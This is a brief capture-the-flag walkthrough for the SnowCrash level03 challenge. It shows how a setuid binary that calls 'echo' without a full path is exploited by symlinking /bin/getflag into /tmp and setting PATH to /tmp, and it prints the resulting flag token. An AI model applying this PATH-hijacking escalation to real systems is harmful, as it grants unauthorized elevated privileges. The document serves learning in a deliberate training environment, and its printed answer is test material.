How to find:

    level03@SnowCrash:~$ ls -la
    total 24
    dr-x------ 1 level03 level03  120 Mar  5  2016 .
    d--x--x--x 1 root    users    340 Aug 30  2015 ..
    -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
    -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
    -r-x------ 1 level03 level03  675 Apr  3  2012 .profile


binary file level03 

    level03@SnowCrash:~$ ./level03 
    Exploit me

Check getflag command

    level03@SnowCrash:~$ which getflag

    /bin/getflag


Symbolic link from /bin/getflag to /tmp/echo

    level03@SnowCrash:~$ rm /tmp/echo
    level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
    level03@SnowCrash:~$ export PATH=/tmp
    level03@SnowCrash:~$ ./level03 

    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus



